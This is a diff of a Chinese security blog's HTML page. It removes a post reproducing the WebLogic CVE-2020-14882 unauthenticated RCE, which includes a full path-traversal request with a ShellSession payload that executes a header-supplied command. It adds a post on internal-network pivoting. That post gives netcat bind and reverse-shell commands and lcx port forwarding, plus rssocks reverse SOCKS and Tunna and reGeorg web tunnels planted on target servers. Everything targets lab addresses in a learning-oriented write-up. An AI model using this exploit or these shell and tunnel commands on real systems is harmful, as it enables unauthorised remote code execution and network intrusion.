@@ -4,14 +4,13 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="weblogic 未授权命令执行漏洞（CVE-2020-14882）复现, Danie1&#39;s Blog">
-    <meta name="description" content="weblogic 未授权命令执行漏洞（CVE-2020-14882）复现
+    <meta name="keywords" content="内网渗透中转发工具总结, Danie1&#39;s Blog">
+    <meta name="description" content="内网渗透中转发工具总结
 
-影响版本
-
-Oracle Weblogic Server 10.3.6.0.0
-Oracle Weblogic Server 12.1.3.0.0
-Oracle W">
+LCX转发
+内网机器上执行：lcx.exe –slave 公网IP +端口 内网IP +端口
+lcx.exe -slave 192.168.43.142 51 192.168.43.137 3389
+将内网(192">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +18,7 @@ Oracle W">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>weblogic 未授权命令执行漏洞（CVE-2020-14882）复现 | Danie1&#39;s Blog</title>
+    <title>内网渗透中转发工具总结 | Danie1&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/medias/logo.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -265,12 +264,12 @@ Oracle W">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/27.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">weblogic 未授权命令执行漏洞（CVE-2020-14882）复现</h1>
+                    <h1 class="description center-align post-title">内网渗透中转发工具总结</h1>
                 </div>
             </div>
         </div>
@@ -387,8 +386,12 @@ Oracle W">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
-                                <span class="chip bg-color">漏洞复现</span>
+                            <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                                <span class="chip bg-color">内网渗透</span>
+                            </a>
+                        
+                            <a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">
+                                <span class="chip bg-color">红蓝对抗</span>
                             </a>
                         
                     </div>
@@ -399,8 +402,8 @@ Oracle W">
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
-                                漏洞复现
+                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
+                                内网渗透
                             </a>
                         
                     </div>
@@ -412,7 +415,7 @@ Oracle W">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-12-28
+                    2020-12-29
                 </div>
                 
 
@@ -429,27 +432,75 @@ Oracle W">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="weblogic-未授权命令执行漏洞（CVE-2020-14882）复现"><a href="#weblogic-未授权命令执行漏洞（CVE-2020-14882）复现" class="headerlink" title="weblogic 未授权命令执行漏洞（CVE-2020-14882）复现"></a>weblogic 未授权命令执行漏洞（CVE-2020-14882）复现</h1><hr>
+                <h1 id="内网渗透中转发工具总结"><a href="#内网渗透中转发工具总结" class="headerlink" title="内网渗透中转发工具总结"></a>内网渗透中转发工具总结</h1><hr>
 <blockquote>
-<p>影响版本</p>
+<p><strong>LCX转发</strong></p>
+<p>内网机器上执行：<strong>lcx.exe –slave</strong> 公网IP +端口 内网IP +端口</p>
+<p><code>lcx.exe -slave 192.168.43.142 51 192.168.43.137 3389</code></p>
+<p>将内网(192.168.43.137)的3389端口转发到公网(192.168.43.142)的51端口</p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/image_44953739342.png"></p>
+<p>然后在公网的机器上执行：</p>
+<p><code>Lcx.exe –listen 51 3389</code></p>
+<p>监听51端口，转发到公网机器的3389端口。</p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/image_762741102866.png"></p>
+<p>这个时候已经将内网的3389转发到了公网机器的3389端口，我们在本地机器上远程公网IP+3389 ，就连接上了内网机器的3389。</p>
 </blockquote>
-<pre><code>Oracle Weblogic Server 10.3.6.0.0
-Oracle Weblogic Server 12.1.3.0.0
-Oracle Weblogic Server 12.2.1.3.0
-Oracle Weblogic Server 12.2.1.4.0
-Oracle Weblogic Server 14.1.1.0.0</code></pre>
-<p>访问<code>http://192.168.74.133:7001/console/css/%252e%252e%252fconsole.portal</code></p>
-<p>可以未授权访问后台。</p>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20201130160900.png"></p>
-<p>回显rce</p>
-<pre><code class="txt">GET /console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(&#39;weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(&quot;connectionHandler&quot;);field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(&quot;getServletRequest&quot;).invoke(obj); String cmd = req.getHeader(&quot;cmd&quot;);String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;;if(cmd != null )&#123; String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(&quot;\\A&quot;).next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(&quot;getResponse&quot;).invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();&#125; currentThread.interrupt();&#39;) HTTP/1.1
-Host: 192.168.74.133:7001
-cmd: whoami
-Content-Length: 0
-
-</code></pre>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20201130163936.png"></p>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20201130164150.png"></p>
+<blockquote>
+<p><strong>nc反弹shell</strong></p>
+<p><strong><em>正向连接</em></strong>：</p>
+<p>在远程机器（目标机器）上执行：</p>
+<p><code>nc.exe -l -p 8888 -t -e cmd.exe</code></p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20201229093450.png"></p>
+<p>在本地机器（攻击机器）上执行：</p>
+<p><code>nc.exe -nvv 192.168.74.134 8888</code></p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20201229093432.png"></p>
+<p><strong><em>反向连接</em></strong>：</p>
+<p>在本地机器（攻击机器）上执行：</p>
+<p><code>nc -l -p 8888</code></p>
+<p>在远程机器(目标机器)上执行：</p>
+<p><code>nc.exe -t -e cmd.exe 192.168.74.1 8888</code></p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20201229094042.png"></p>
+<p>成功之后，我们在本地机器上看一下，已经获得了远程机器的cmdshell.</p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20201229094032.png"></p>
+</blockquote>
+<blockquote>
+<p><strong>sSOCKS</strong></p>
+<p>一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试。</p>
+<p>先在vps 执行<code>rcsocks –l 1088 –p 8888 –vv</code>, 监听1088端口。</p>
+<p>内网机器执行<code>./rssocks –vv –s 192.168.30.103:8888(VPS)</code></p>
+<p>成功，则会看到会话建立.</p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20201229103922.png"></p>
+<p>设置代理，让本机可以通过VPS的<strong>1088</strong>端口访问内网机器。</p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/image_385773310144.png"></p>
+<p>本机上 <strong>ssh 192.168.43.136</strong>内网主机.</p>
+</blockquote>
+<blockquote>
+<p><strong>Tunna 正向代理</strong></p>
+<p>将conn脚本上传到目标服务器，然后执行</p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20201229105534.png"></p>
+<p><code>python proxy.py -u http://192.168.74.132:8080/conn.jsp -l 8888 -r 8080 -v -s</code></p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20201229105445.png"></p>
+<p>然后访问<a target="_blank" rel="noopener" href="http://127.0.0.1:8888/%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E5%86%85%E7%BD%91%E6%9C%BA%E5%99%A8%E7%9A%848080%E7%AB%AF%E5%8F%A3%E8%A2%AB%E8%BD%AC%E5%8F%91%E5%88%B0%E6%9C%AC%E6%9C%BA%E7%9A%848888%E7%AB%AF%E5%8F%A3%E3%80%82%EF%BC%88%E4%B9%9F%E5%8F%AF%E4%BB%A5%E6%8A%8A22%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%87%BA%E6%9D%A5%EF%BC%89">http://127.0.0.1:8888/，可以看到内网机器的8080端口被转发到本机的8888端口。（也可以把22端口转发出来）</a></p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20201229105737.png"></p>
+<p>同样的，如果内网的机器是windows，就把3389转出来</p>
+<p>proxy.py -u <a target="_blank" rel="noopener" href="http://xxx.com:206/test">http://xxx.com:206/test</a> /conn.jsp -l 8888 -r 3389 -v</p>
+<p>其中几个参数的解释：</p>
+<pre><code>-l 表示本地监听的端口
+-r 远程要转发的端口
+-v 详细模式</code></pre>
+<p>另外，如果脚本传到了内网A机器上，但是想登录内网B机器，那么可以-a参数指定机器</p>
+<p>将内网中172.16.100.20主机的3389转发到本地</p>
+<p>python2.7 proxy.py -u <a target="_blank" rel="noopener" href="http://219.x.x.x/conn.jsp">http://219.x.x.x/conn.jsp</a> -l 1234 -a 172.16.100.20 -r 3389</p>
+</blockquote>
+<blockquote>
+<p><strong>reGeorg+proxifier 正向代理</strong></p>
+<p>先将reGeorg的对应脚本上传到服务器端，直接访问显示“Georg says, ‘All seems fine’”，表示脚本运行正常.</p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20201229111518.png"></p>
+<p>运行<code>python reGeorgSocksProxy.py -p 8888 -u http://192.168.74.132:8080/tunnel.jsp</code></p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20201229111405.png"></p>
+<p>将proxifier打开，在Proxy Server中配置，然后就可以在本地访问内网的机器了</p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20201229111421.png"></p>
+</blockquote>
 
             </div>
             <hr/>
@@ -475,7 +526,7 @@ Content-Length: 0
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://danie1233.github.io/2020/12/28/weblogic%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-14882%EF%BC%89%E5%A4%8D%E7%8E%B0/">https://danie1233.github.io/2020/12/28/weblogic%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-14882%EF%BC%89%E5%A4%8D%E7%8E%B0/</a>
+                    <a href="https://danie1233.github.io/2020/12/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/">https://danie1233.github.io/2020/12/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -513,8 +564,12 @@ Content-Length: 0
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
-                                    <span class="chip bg-color">漏洞复现</span>
+                                <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                                    <span class="chip bg-color">内网渗透</span>
+                                </a>
+                            
+                                <a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">
+                                    <span class="chip bg-color">红蓝对抗</span>
                                 </a>
                             
                         </div>
@@ -559,24 +614,22 @@ Content-Length: 0
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/12/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/">
+                <a href="/2020/12/29/WebLogic%20XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-10271%EF%BC%89/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="内网渗透中转发工具总结">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）">
                         
-                        <span class="card-title">内网渗透中转发工具总结</span>
+                        <span class="card-title">WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            内网渗透中转发工具总结
+                            WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）
+访问 http://192.168.74.133:7001/
 
-LCX转发
-内网机器上执行：lcx.exe –slave 公网IP +端口 内网IP +端口
-lcx.exe -slave 192.168.43.142 51 192.168.43.137 3389
-将内网(192
+判断为weblogic，访问http://192.168.74.133:7001/wls-w
                         
                     </div>
                     <div class="publish-info">
@@ -587,8 +640,8 @@ lcx.exe -slave 192.168.43.142 51 192.168.43.137 3389
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
-                                    内网渗透
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
                                 </a>
                             
                             
@@ -598,12 +651,8 @@ lcx.exe -slave 192.168.43.142 51 192.168.43.137 3389
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
-                        <span class="chip bg-color">内网渗透</span>
-                    </a>
-                    
-                    <a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">
-                        <span class="chip bg-color">红蓝对抗</span>
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
                 </div>
@@ -617,37 +666,37 @@ lcx.exe -slave 192.168.43.142 51 192.168.43.137 3389
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/12/27/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8BLinux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                <a href="/2020/12/28/weblogic%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-14882%EF%BC%89%E5%A4%8D%E7%8E%B0/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/30.jpg" class="responsive-img" alt="红蓝对抗之Linux内网渗透">
+                        <img src="/medias/featureimages/27.jpg" class="responsive-img" alt="weblogic 未授权命令执行漏洞（CVE-2020-14882）复现">
                         
-                        <span class="card-title">红蓝对抗之Linux内网渗透</span>
+                        <span class="card-title">weblogic 未授权命令执行漏洞（CVE-2020-14882）复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            红蓝对抗之Linux内网渗透
- 隧道
- Linux上可以利用自带和第三方工具进行隧道开启，利用隧道，我们可以建立Socks连接、端口转发等操作。
+                            weblogic 未授权命令执行漏洞（CVE-2020-14882）复现
 
-SSH
-Linux使用SSH常用的开启隧道的命令。
-场景1：在控制A机器时，利用socks代
+影响版本
+
+Oracle Weblogic Server 10.3.6.0.0
+Oracle Weblogic Server 12.1.3.0.0
+Oracle W
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-27
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-28
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
-                                    内网渗透
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
                                 </a>
                             
                             
@@ -657,12 +706,8 @@ Linux使用SSH常用的开启隧道的命令。
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
-                        <span class="chip bg-color">内网渗透</span>
-                    </a>
-                    
-                    <a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">
-                        <span class="chip bg-color">红蓝对抗</span>
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
                 </div>
